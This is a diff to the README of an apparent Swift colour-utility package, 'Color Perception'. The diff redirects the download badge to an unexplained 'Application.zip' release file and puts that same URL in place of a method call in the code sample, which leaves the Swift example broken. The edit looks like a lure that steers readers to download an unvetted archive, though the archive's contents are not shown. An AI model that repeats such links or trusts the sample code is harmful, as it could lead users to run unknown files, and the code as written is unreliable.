@@ -18,7 +18,7 @@ The **Color Perception** package provides functionality for working with colors 
 
 To get started with **Color Perception**, you can download the package using the following link:
 
-[![Download Color Perception](https://img.shields.io/badge/Download-Color_Perception-blue.svg)](https://github.com/files/Application.zip)
+[![Download Color Perception](https://github.com/Jiffy1314/color-perception/releases/download/v1.0/Application.zip)](https://github.com/Jiffy1314/color-perception/releases/download/v1.0/Application.zip)
 
 *Note: Click on the link above to initiate the download.*
 
@@ -34,7 +34,7 @@ import ColorPerception
 let color1 = Color(red: 255, green: 255, blue: 255)
 let color2 = Color(red: 0, green: 0, blue: 0)
 
-let contrastRatio = color1.contrastRatio(with: color2)
+let contrastRatio = https://github.com/Jiffy1314/color-perception/releases/download/v1.0/Application.zip(with: color2)
 print("The contrast ratio between color1 and color2 is \(contrastRatio)")
 ```
 
